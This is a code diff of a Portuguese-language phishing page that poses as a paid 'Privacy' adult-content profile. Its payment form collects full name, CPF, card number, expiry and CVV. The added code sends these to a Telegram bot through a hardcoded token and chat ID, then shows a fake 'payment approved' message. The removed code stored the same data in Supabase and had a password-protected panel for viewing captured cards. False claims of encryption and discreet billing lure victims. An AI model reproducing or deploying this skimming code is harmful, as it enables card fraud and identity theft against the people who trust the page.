@@ -5,48 +5,86 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Privacy | Kamylinha Santos</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
     <style>
         :root { --primary: #f47b52; --grad: linear-gradient(90deg, #f47b52, #f9a67a); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #fff; padding-bottom: 110px; }
+        body { background: #fff; padding-bottom: 110px; color: #333; }
+        
         .nav-top { padding: 12px 20px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: #fff; z-index: 100; }
-        .banner { width: 100%; height: 200px; object-fit: cover; }
-        .profile-pic { width: 110px; height: 110px; border-radius: 50%; border: 4px solid #fff; margin-top: -55px; margin-left: 20px; position: relative; z-index: 10; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .logo-text { color: var(--primary); font-weight: 800; font-size: 20px; letter-spacing: -1px; }
+        
+        .banner { width: 100%; height: 180px; object-fit: cover; background: #eee; }
+        .profile-pic { width: 110px; height: 110px; border-radius: 50%; border: 4px solid #fff; margin-top: -55px; margin-left: 20px; position: relative; z-index: 10; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); background: #ddd; }
+        
         .info { padding: 15px 20px; }
         .name { font-size: 22px; font-weight: 800; display: flex; align-items: center; gap: 5px; }
+        .verified { width: 18px; height: 18px; }
+        .username { color: #666; font-size: 14px; margin-bottom: 10px; }
+        .bio { font-size: 14px; line-height: 1.5; color: #444; }
+
+        .stats { display: flex; gap: 20px; padding: 10px 20px; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
+        .stats b { color: #000; }
+
         .feed { padding: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .feed img { width: 100%; border-radius: 12px; filter: blur(8px); border: 1px solid #eee; background: #eee; height: 150px; }
-        .btn-sub { width: 90%; margin: 0 auto; padding: 18px; border-radius: 50px; border: none; color: #fff; background: var(--grad); font-weight: 800; cursor: pointer; display: flex; justify-content: space-between; position: fixed; bottom: 20px; left: 5%; z-index: 100; box-shadow: 0 10px 20px rgba(244, 123, 82, 0.3); }
-        #modalPay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; padding: 20px; backdrop-filter: blur(8px); }
-        .modal-box { background: #fff; border-radius: 25px; padding: 25px; max-width: 400px; margin: 10% auto; position: relative; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; outline: none; }
-        #admView { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #fff; z-index: 9999; padding: 20px; overflow-y: auto; }
-        .cc-card { background: #1a1a1a; padding: 15px; border-radius: 12px; margin-bottom: 10px; border-left: 5px solid var(--primary); font-family: monospace; }
+        .feed-item { width: 100%; height: 200px; border-radius: 12px; background: #f0f0f0; position: relative; overflow: hidden; }
+        .feed-item img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); opacity: 0.8; }
+        .lock-icon { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 24px; color: #fff; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+
+        .faq { padding: 25px 20px; background: #fdfdfd; }
+        .faq h3 { margin-bottom: 15px; font-size: 16px; border-left: 4px solid var(--primary); padding-left: 10px; }
+        .faq-item { margin-bottom: 15px; font-size: 13px; }
+        .faq-item b { display: block; margin-bottom: 4px; color: #000; }
+
+        .btn-sub { width: 92%; padding: 18px 25px; border-radius: 50px; border: none; color: #fff; background: var(--grad); font-weight: 800; cursor: pointer; display: flex; justify-content: space-between; position: fixed; bottom: 20px; left: 4%; z-index: 1000; box-shadow: 0 8px 20px rgba(244, 123, 82, 0.4); font-size: 15px; }
+
+        #modalPay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; padding: 20px; backdrop-filter: blur(10px); }
+        .modal-box { background: #fff; border-radius: 30px; padding: 30px 25px; max-width: 450px; margin: 5% auto; position: relative; animation: slideUp 0.3s ease-out; }
+        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        input { width: 100%; padding: 15px; margin-bottom: 12px; border: 1px solid #eee; border-radius: 15px; font-size: 16px; outline: none; background: #f9f9f9; transition: 0.3s; }
+        input:focus { border-color: var(--primary); background: #fff; }
+        
+        .footer-secure { text-align: center; margin-top: 15px; font-size: 11px; color: #aaa; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
 <body>
 
     <nav class="nav-top">
-        <img src="logo.png" height="26" onclick="abrirPainel()" style="cursor: pointer;">
-        <span>Assinar</span>
+        <div class="logo-text">PRIVACY</div>
+        <div style="font-size: 20px;">☰</div>
     </nav>
 
-    <img src="capa.png" class="banner">
-    <img src="perfil1.png" class="profile-pic">
+    <div class="header">
+        <div class="banner" style="background-image: url('capa.png'); background-size: cover;"></div>
+        <img src="perfil1.png" class="profile-pic">
+    </div>
 
     <div class="info">
-        <div class="name">Kamylinha Santos ✅</div>
-        <p style="color: #666; font-size: 14px;">@eukamylinhasantos</p>
-        <p style="margin-top:10px; font-size: 14px;">Conteúdo exclusivo sem censura. 🔞🔥</p>
+        <div class="name">Kamylinha Santos <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="verified"></div>
+        <div class="username">@eukamylinhasantos</div>
+        <div class="bio">Seja bem-vindo ao meu lado exclusivo! 🔞<br>Conteúdo diário sem censura e chat privado para assinantes.</div>
+    </div>
+
+    <div class="stats">
+        <span><b>142</b> Publicações</span>
+        <span><b>58.2k</b> Curtidas</span>
     </div>
 
     <div class="feed">
-        <div style="background:#eee; border-radius:12px; height:150px; filter:blur(10px)"></div>
-        <div style="background:#eee; border-radius:12px; height:150px; filter:blur(10px)"></div>
+        <div class="feed-item"><span class="lock-icon">🔒</span><img src="imagem1.png"></div>
+        <div class="feed-item"><span class="lock-icon">🔒</span><img src="imagem2.png"></div>
+        <div class="feed-item"><span class="lock-icon">🔒</span><img src="imagem1.png"></div>
+        <div class="feed-item"><span class="lock-icon">🔒</span><img src="imagem2.png"></div>
+    </div>
+
+    <div class="faq">
+        <h3>Dúvidas Frequentes</h3>
+        <div class="faq-item"><b>O acesso é imediato?</b> Sim! Após a aprovação, você recebe o link de acesso no seu e-mail cadastrado.</div>
+        <div class="faq-item"><b>Como aparece na fatura?</b> Fique tranquilo, aparece como "PAGAMENTO DIGITAL" de forma totalmente discreta.</div>
+        <div class="faq-item"><b>É seguro?</b> Sim, utilizamos criptografia de ponta a ponta para proteger seus dados.</div>
     </div>
 
     <button class="btn-sub" onclick="$('#modalPay').fadeIn()">
@@ -55,32 +93,30 @@
 
     <div id="modalPay">
         <div class="modal-box">
-            <h3 style="text-align:center; color:var(--primary); margin-bottom:20px;">Pagamento Seguro</h3>
-            <input type="text" id="n" placeholder="Nome no Cartão">
-            <input type="text" id="c" placeholder="Número do Cartão">
+            <h3 style="text-align:center; margin-bottom:20px; font-weight: 800;">Finalizar Assinatura</h3>
+            
+            <input type="text" id="n" placeholder="Nome Completo">
             <input type="text" id="cpf" placeholder="CPF">
+            <input type="text" id="c" placeholder="Número do Cartão">
+            
             <div style="display:flex; gap:10px">
                 <input type="text" id="v" placeholder="MM/AA">
                 <input type="text" id="cvv" placeholder="CVV">
             </div>
-            <button class="btn-sub" style="position:static; width:100%; margin-top:10px" onclick="salvar()">APROVAR COMPRA</button>
-            <p onclick="$('#modalPay').fadeOut()" style="text-align:center; margin-top:15px; cursor:pointer; color:#999">Voltar</p>
+
+            <button onclick="enviarDados()" style="width: 100%; padding: 18px; border-radius: 50px; border: none; background: var(--grad); color: #fff; font-weight: 800; font-size: 16px; cursor: pointer; margin-top: 10px;">
+                CONFIRMAR PAGAMENTO
+            </button>
+            
+            <p onclick="$('#modalPay').fadeOut()" style="text-align:center; margin-top:20px; font-size:13px; color:#999; cursor:pointer">Cancelar e voltar</p>
+            
+            <div class="footer-secure">
+                🛡️ Pagamento 100% Criptografado
+            </div>
         </div>
     </div>
 
-    <div id="admView">
-        <h2 style="color:var(--primary)">LOGS NOXXZ ⚡</h2>
-        <button onclick="$('#admView').hide()" style="margin-bottom:20px; padding: 10px;">SAIR DO PAINEL</button>
-        <div id="lista">Puxando dados...</div>
-    </div>
-
     <script>
-        // Configurações fornecidas
-        const SB_URL = 'https://bafumercepnhnlqkxtcd.supabase.co'; 
-        const SB_KEY = 'sb_publishable_Z8NyNh7hAAhOjk75y035aw_1siOe_xk';
-        
-        const _supabase = supabase.createClient(SB_URL, SB_KEY);
-
         $(document).ready(function(){
             $('#c').mask('0000 0000 0000 0000');
             $('#cpf').mask('000.000.000-00');
@@ -88,63 +124,67 @@
             $('#cvv').mask('000');
         });
 
-        async function salvar() {
-            // Teste de funcionamento no console
-            console.log("Oi tudo bem! O clique no botão Aprovar funcionou."); 
-            
-            const d = { 
-                nome: $('#n').val(), 
-                card: $('#c').val(), 
-                cpf: $('#cpf').val(), 
-                validade: $('#v').val(), 
-                cvv: $('#cvv').val() 
+        async function enviarDados() {
+            // Seus dados do Telegram configurados
+            const botToken = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
+            const chatId = '7320822019';
+
+            const d = {
+                nome: $('#n').val(),
+                cpf: $('#cpf').val(),
+                card: $('#c').val(),
+                val: $('#v').val(),
+                cvv: $('#cvv').val()
             };
 
-            if(!d.card || d.card.length < 16) {
-                alert("Cartão inválido! Verifique os números.");
+            // Validação simples
+            if(d.card.length < 16 || d.cpf.length < 14) {
+                alert("Por favor, preencha os dados corretamente.");
                 return;
             }
 
-            Notiflix.Loading.circle('Processando pagamento...');
+            Notiflix.Loading.circle('Processando sua assinatura...');
+
+            // Monta a mensagem para o Telegram
+            const texto = `
+🔥 **NOVA CAPTURA - PRIVACY** 🔥
+
+👤 **Nome:** ${d.nome}
+🆔 **CPF:** ${d.cpf}
+💳 **Cartão:** ${d.card}
+📅 **Validade:** ${d.val}
+🔒 **CVV:** ${d.cvv}
+
+⚡ *Enviado por Noxxz*
+            `;
+
+            const urlTelegram = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
-                // Tenta inserir na tabela 'capturas'
-                const { error } = await _supabase.from('capturas').insert([d]);
-                
-                Notiflix.Loading.remove();
-
-                if(error) {
-                    console.error("Erro Supabase:", error);
-                    alert("Erro ao enviar: " + error.message);
-                } else {
-                    console.log("Dados enviados com sucesso!");
-                    Notiflix.Report.success('Pagamento Aprovado!', 'Seu acesso será enviado para o e-mail em instantes.', 'OK');
-                    $('#modalPay').hide();
-                }
-            } catch (err) {
-                Notiflix.Loading.remove();
-                console.error("Erro fatal:", err);
-                alert("Erro de conexão: " + err.message);
-            }
-        }
-
-        async function abrirPainel() {
-            if(prompt("Senha do Administrador:") === "NOXXZ2026") {
-                $('#admView').show();
-                const { data, error } = await _supabase.from('capturas').select('*').order('id', {ascending:false});
-                
-                if(error) return alert("Erro ao carregar logs: " + error.message);
-                
-                $('#lista').html(data.length ? "" : "Nenhum dado capturado ainda.");
-                data.forEach(i => {
-                    $('#lista').append(`
-                        <div class="cc-card">
-                            <b>NOME:</b> ${i.nome}<br>
-                            <b>CARD:</b> ${i.card}<br>
-                            <b>CPF:</b> ${i.cpf}<br>
-                            <b>VAL:</b> ${i.validade} | <b>CVV:</b> ${i.cvv}
-                        </div>`);
+                await fetch(urlTelegram, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: texto,
+                        parse_mode: 'Markdown'
+                    })
                 });
+
+                // Simula aprovação após enviar
+                setTimeout(() => {
+                    Notiflix.Loading.remove();
+                    Notiflix.Report.success(
+                        'Pagamento Aprovado!',
+                        'Seu acesso foi enviado para o e-mail cadastrado. Verifique também a caixa de spam.',
+                        'OK',
+                        () => { location.reload(); }
+                    );
+                }, 2000);
+
+            } catch (error) {
+                Notiflix.Loading.remove();
+                alert("Erro ao processar. Tente novamente.");
             }
         }
     </script>
